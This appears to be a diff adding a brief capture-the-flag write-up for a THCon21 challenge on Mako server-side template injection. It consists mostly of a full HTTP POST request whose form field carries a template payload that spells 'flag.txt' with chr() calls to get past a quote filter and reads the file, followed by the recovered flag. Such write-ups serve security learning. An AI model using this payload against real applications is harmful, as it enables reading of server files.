@@ -1,0 +1,28 @@
+Header
+```
+Template: mako
+```
+
+" and ' cannot be used in number fields !
+
+# open("flag.txt").read()
+
+POST / HTTP/1.1
+Host: remote1.thcon.party:10750
+Content-Length: 124
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://remote1.thcon.party:10750
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://remote1.thcon.party:10750/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+name=a&lastname=b&number=${open(chr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(46)%2bchr(116)%2bchr(120)%2bchr(116)).read()}
+
+```
+THCon21{D0n't_m355_W1th_T3mpl@T3_3ng1Ne}
+```
